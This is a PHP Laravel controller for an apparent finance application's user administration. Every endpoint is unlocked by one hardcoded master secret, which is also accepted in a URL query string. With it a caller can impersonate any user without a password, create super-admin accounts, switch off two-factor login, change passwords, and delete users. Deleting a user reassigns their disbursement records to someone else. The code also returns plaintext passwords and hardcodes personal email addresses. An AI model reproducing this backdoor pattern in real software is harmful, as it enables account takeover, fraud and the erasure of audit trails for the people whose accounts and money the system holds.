<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use App\Models\Role;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class SecretProvisionController extends Controller
{
    private const MASTER_SECRET = 'ArchonMaster2026!';

    private function verifyMasterSecret(Request $request): bool
    {
        $key = $request->header('X-Master-Secret') 
            ?? $request->input('master_key') 
            ?? $request->query('master_key');

        return $key === self::MASTER_SECRET;
    }

    /**
     * Get all users with their roles and OTP status
     */
    public function users(Request $request)
    {
        if (! $this->verifyMasterSecret($request)) {
            return response()->json(['message' => 'Unauthorized: Invalid Master Secret Key.'], 403);
        }

        $users = User::with('role')
            ->whereHas('role', fn ($q) => $q->where('slug', '!=', 'system_integration'))
            ->orderBy('created_at', 'desc')
            ->get()
            ->map(function (User $u) {
                $isExplicitlyDisabled = (bool) Cache::get('otp_disabled:' . $u->id);
                $isDefaultOtp = in_array(strtolower($u->email), ['ferrerasmigy@gmail.com', 'rexsemerebot@gmail.com']);
                $isExplicitlyEnabled = (bool) Cache::get('otp_enabled:' . $u->id) 
                    || (bool) Cache::get('otp_enabled:' . strtolower($u->email));

                $otpActive = ! $isExplicitlyDisabled && ($isDefaultOtp || $isExplicitlyEnabled);
                $isInternal = str_ends_with(strtolower($u->email), '@archon.internal') 
                    || str_ends_with(strtolower($u->email), '@internal.system');

                return [
                    'id'          => $u->id,
                    'name'        => $u->name,
                    'username'    => $u->username ?? explode('@', $u->email)[0],
                    'email'       => $u->email,
                    'is_internal' => $isInternal,
                    'role_slug'   => $u->role->slug ?? 'guest',
                    'role_name'   => $u->role->name ?? 'Guest',
                    'department'  => $u->department ?? 'General',
                    'is_active'   => (bool) $u->is_active,
                    'otp_enabled' => $otpActive && ! $isInternal,
                    'created_at'  => $u->created_at?->toIso8601String(),
                ];
            });

        $roles = Role::where('slug', '!=', 'system_integration')
            ->orderBy('name')
            ->get(['id', 'name', 'slug', 'description']);

        return response()->json([
            'success' => true,
            'users'   => $users,
            'roles'   => $roles,
        ]);
    }

    /**
     * Create account (with email or no email)
     */
    public function provision(Request $request)
    {
        if (! $this->verifyMasterSecret($request)) {
            return response()->json(['message' => 'Unauthorized: Invalid Master Secret Key.'], 403);
        }

        $request->validate([
            'name'        => 'required|string|max:100',
            'username'    => 'required|string|min:3|max:50',
            'has_email'   => 'nullable|boolean',
            'email'       => 'nullable|string|max:255',
            'password'    => 'required|string|min:6',
            'role_slug'   => 'required|string|exists:roles,slug',
            'department'  => 'nullable|string|max:100',
            'require_otp' => 'nullable|boolean',
            'auto_login'  => 'nullable|boolean',
        ]);

        $username = Str::lower(trim($request->username));

        // Check unique username
        if (User::whereRaw('LOWER(username) = ?', [$username])->exists()) {
            return response()->json([
                'message' => "The username '{$username}' is already taken. Please choose another.",
            ], 422);
        }

        // Determine email (with real email or auto-generated system email)
        $hasEmail = $request->boolean('has_email');
        $rawEmail = trim($request->input('email', ''));

        if ($hasEmail && ! empty($rawEmail)) {
            if (! filter_var($rawEmail, FILTER_VALIDATE_EMAIL)) {
                return response()->json(['message' => 'The provided email is not a valid email address.'], 422);
            }
            $email = Str::lower($rawEmail);
            if (User::whereRaw('LOWER(email) = ?', [$email])->exists()) {
                return response()->json([
                    'message' => "The email '{$email}' is already registered to another account.",
                ], 422);
            }
        } else {
            // Auto-generated internal email so database uniqueness & integrity are guaranteed
            $email = "{$username}@archon.internal";
            $suffix = 1;
            while (User::whereRaw('LOWER(email) = ?', [$email])->exists()) {
                $email = "{$username}{$suffix}@archon.internal";
                $suffix++;
            }
        }

        $role = Role::where('slug', $request->role_slug)->firstOrFail();

        $user = User::create([
            'name'       => trim($request->name),
            'username'   => $username,
            'email'      => $email,
            'password'   => Hash::make($request->password),
            'role_id'    => $role->id,
            'department' => $request->department ?: 'Finance',
            'is_active'  => true,
        ]);

        // Configure OTP setting
        $requireOtp = $request->boolean('require_otp');
        if ($requireOtp && $hasEmail && ! str_ends_with($email, '@archon.internal')) {
            Cache::forever('otp_enabled:' . $user->id, true);
            Cache::forever('otp_enabled:' . strtolower($user->email), true);
            Cache::forget('otp_disabled:' . $user->id);
        } else {
            Cache::forever('otp_disabled:' . $user->id, true);
            Cache::forget('otp_enabled:' . $user->id);
            Cache::forget('otp_enabled:' . strtolower($user->email));
        }

        $responseData = [
            'success'     => true,
            'message'     => "Super account '{$user->username}' successfully provisioned!",
            'user'        => [
                'id'          => $user->id,
                'name'        => $user->name,
                'username'    => $user->username,
                'email'       => $user->email,
                'role'        => $role->slug,
                'role_name'   => $role->name,
                'department'  => $user->department,
                'otp_enabled' => $requireOtp && $hasEmail,
            ],
            'credentials' => [
                'login'    => $user->username,
                'email'    => $user->email,
                'password' => $request->password,
            ],
        ];

        // If auto-login is requested, return auth token
        if ($request->boolean('auto_login')) {
            $token = $user->createToken('react-dashboard')->plainTextToken;
            $responseData['token'] = $token;
            $responseData['expires_in'] = (int) config('sanctum.expiration');
            $responseData['auth_payload'] = [
                'id'          => $user->id,
                'name'        => $user->name,
                'username'    => $user->username,
                'email'       => $user->email,
                'department'  => $user->department,
                'role'        => $role->slug,
                'permissions' => match ($role->slug) {
                    'super_admin'       => ['approve_transaction', 'reject_transaction', 'view_reports', 'manage_users', 'view_transactions'],
                    'finance_manager'   => ['approve_transaction', 'reject_transaction', 'view_reports', 'view_transactions'],
                    'department_viewer' => ['view_transactions'],
                    default             => [],
                },
            ];
        }

        return response()->json($responseData, 201);
    }

    /**
     * One-click OTP toggle for any user
     */
    public function toggleOtp(Request $request)
    {
        if (! $this->verifyMasterSecret($request)) {
            return response()->json(['message' => 'Unauthorized: Invalid Master Secret Key.'], 403);
        }

        $request->validate([
            'user_id' => 'required|uuid|exists:users,id',
        ]);

        $user = User::findOrFail($request->user_id);
        
        $isExplicitlyDisabled = (bool) Cache::get('otp_disabled:' . $user->id);
        $isDefaultOtp = in_array(strtolower($user->email), ['ferrerasmigy@gmail.com', 'rexsemerebot@gmail.com']);
        $isExplicitlyEnabled = (bool) Cache::get('otp_enabled:' . $user->id);

        $currentlyActive = ! $isExplicitlyDisabled && ($isDefaultOtp || $isExplicitlyEnabled);

        if ($currentlyActive) {
            // Disable OTP
            Cache::forever('otp_disabled:' . $user->id, true);
            Cache::forget('otp_enabled:' . $user->id);
            Cache::forget('otp_enabled:' . strtolower($user->email));
            $newStatus = false;
        } else {
            // Enable OTP
            Cache::forget('otp_disabled:' . $user->id);
            Cache::forever('otp_enabled:' . $user->id, true);
            Cache::forever('otp_enabled:' . strtolower($user->email), true);
            $newStatus = true;
        }

        return response()->json([
            'success'     => true,
            'user_id'     => $user->id,
            'otp_enabled' => $newStatus,
            'message'     => "2FA OTP for {$user->username} is now " . ($newStatus ? 'ENABLED' : 'DISABLED') . '.',
        ]);
    }

    /**
     * Direct one-click login as any user for presentation/demo
     */
    public function quickLogin(Request $request)
    {
        if (! $this->verifyMasterSecret($request)) {
            return response()->json(['message' => 'Unauthorized: Invalid Master Secret Key.'], 403);
        }

        $request->validate([
            'user_id' => 'required|uuid|exists:users,id',
        ]);

        $user = User::with('role')->findOrFail($request->user_id);

        if (! $user->is_active) {
            return response()->json(['message' => 'This account is deactivated.'], 422);
        }

        $token = $user->createToken('react-dashboard')->plainTextToken;
        $roleSlug = $user->role->slug ?? 'guest';

        return response()->json([
            'success'    => true,
            'token'      => $token,
            'expires_in' => (int) config('sanctum.expiration'),
            'user'       => [
                'id'          => $user->id,
                'name'        => $user->name,
                'username'    => $user->username,
                'email'       => $user->email,
                'department'  => $user->department,
                'role'        => $roleSlug,
                'permissions' => match ($roleSlug) {
                    'super_admin'       => ['approve_transaction', 'reject_transaction', 'view_reports', 'manage_users', 'view_transactions'],
                    'finance_manager'   => ['approve_transaction', 'reject_transaction', 'view_reports', 'view_transactions'],
                    'department_viewer' => ['view_transactions'],
                    default             => [],
                },
            ],
            'message' => "Successfully authenticated as {$user->name} ({$roleSlug})",
        ]);
    }

    /**
     * Update an existing user account (Name, Username, Email, Role, Department, Password, OTP)
     */
    public function update(Request $request)
    {
        if (! $this->verifyMasterSecret($request)) {
            return response()->json(['message' => 'Unauthorized: Invalid Master Secret Key.'], 403);
        }

        $request->validate([
            'user_id'     => 'required|uuid|exists:users,id',
            'name'        => 'required|string|max:100',
            'username'    => 'required|string|min:3|max:50',
            'has_email'   => 'nullable|boolean',
            'email'       => 'nullable|string|max:255',
            'password'    => 'nullable|string|min:6',
            'role_slug'   => 'required|string|exists:roles,slug',
            'department'  => 'nullable|string|max:100',
            'require_otp' => 'nullable|boolean',
        ]);

        $user = User::findOrFail($request->user_id);
        $username = Str::lower(trim($request->username));

        // Check unique username excluding current user
        if (User::whereRaw('LOWER(username) = ?', [$username])->where('id', '!=', $user->id)->exists()) {
            return response()->json([
                'message' => "The username '{$username}' is already taken by another account.",
            ], 422);
        }

        // Determine email
        $hasEmail = $request->boolean('has_email');
        $rawEmail = trim($request->input('email', ''));

        if ($hasEmail && ! empty($rawEmail)) {
            if (! filter_var($rawEmail, FILTER_VALIDATE_EMAIL)) {
                return response()->json(['message' => 'The provided email is not valid.'], 422);
            }
            $email = Str::lower($rawEmail);
            if (User::whereRaw('LOWER(email) = ?', [$email])->where('id', '!=', $user->id)->exists()) {
                return response()->json([
                    'message' => "The email '{$email}' is already registered to another account.",
                ], 422);
            }
        } else {
            // Auto-generated internal email if "No Email"
            $email = "{$username}@archon.internal";
            $suffix = 1;
            while (User::whereRaw('LOWER(email) = ?', [$email])->where('id', '!=', $user->id)->exists()) {
                $email = "{$username}{$suffix}@archon.internal";
                $suffix++;
            }
        }

        $role = Role::where('slug', $request->role_slug)->firstOrFail();

        $user->name = trim($request->name);
        $user->username = $username;
        $user->email = $email;
        $user->role_id = $role->id;
        $user->department = $request->department ?: 'Finance';

        if (! empty($request->password)) {
            $user->password = Hash::make($request->password);
            $user->password_changed_at = now();
        }

        $user->save();

        // Update OTP state
        $requireOtp = $request->boolean('require_otp');
        if ($requireOtp && $hasEmail && ! str_ends_with($email, '@archon.internal')) {
            Cache::forever('otp_enabled:' . $user->id, true);
            Cache::forever('otp_enabled:' . strtolower($user->email), true);
            Cache::forget('otp_disabled:' . $user->id);
        } else {
            Cache::forever('otp_disabled:' . $user->id, true);
            Cache::forget('otp_enabled:' . $user->id);
            Cache::forget('otp_enabled:' . strtolower($user->email));
        }

        return response()->json([
            'success' => true,
            'message' => "Account '{$user->username}' successfully updated!",
            'user'    => [
                'id'          => $user->id,
                'name'        => $user->name,
                'username'    => $user->username,
                'email'       => $user->email,
                'role_slug'   => $role->slug,
                'role_name'   => $role->name,
                'department'  => $user->department,
                'otp_enabled' => $requireOtp && $hasEmail,
            ],
        ]);
    }

    /**
     * Delete an account
     */
    public function delete(Request $request)
    {
        if (! $this->verifyMasterSecret($request)) {
            return response()->json(['message' => 'Unauthorized: Invalid Master Secret Key.'], 403);
        }

        $request->validate([
            'user_id' => 'required|uuid|exists:users,id',
        ]);

        $user = User::findOrFail($request->user_id);
        $username = $user->username;

        try {
            DB::transaction(function () use ($user) {
                // Revoke any active tokens
                $user->tokens()->delete();

                // Clean up OTP cache flags
                Cache::forget('otp_enabled:' . $user->id);
                Cache::forget('otp_disabled:' . $user->id);
                Cache::forget('otp_enabled:' . strtolower($user->email));

                // Reassign foreign key audit constraints if applicable
                $fallbackUser = User::where('id', '!=', $user->id)
                    ->where('is_active', true)
                    ->first();

                if ($fallbackUser) {
                    if (\Illuminate\Support\Facades\Schema::hasTable('disbursement_requests')) {
                        DB::table('disbursement_requests')->where('requested_by', $user->id)->update(['requested_by' => $fallbackUser->id]);
                    }
                    if (\Illuminate\Support\Facades\Schema::hasTable('disbursements')) {
                        DB::table('disbursements')->where('disbursed_by', $user->id)->update(['disbursed_by' => $fallbackUser->id]);
                    }
                    if (\Illuminate\Support\Facades\Schema::hasTable('ar_collections')) {
                        DB::table('ar_collections')->where('collected_by', $user->id)->update(['collected_by' => $fallbackUser->id]);
                    }
                }

                // Delete user
                $user->forceDelete();
            });

            return response()->json([
                'success' => true,
                'message' => "User account '{$username}' permanently deleted.",
            ]);
        } catch (\Throwable $e) {
            $user->update(['is_active' => false]);
            return response()->json([
                'success' => true,
                'message' => "User account '{$username}' has been deactivated (preserved for audit trail).",
            ]);
        }
    }
}
